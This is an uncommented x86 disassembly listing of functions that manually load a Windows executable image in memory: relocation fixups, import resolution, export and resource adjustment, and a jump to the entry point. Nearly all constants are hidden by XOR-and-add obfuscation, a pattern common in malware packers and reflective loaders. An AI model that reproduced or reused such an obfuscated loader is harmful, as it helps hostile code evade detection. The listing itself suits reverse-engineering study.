  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
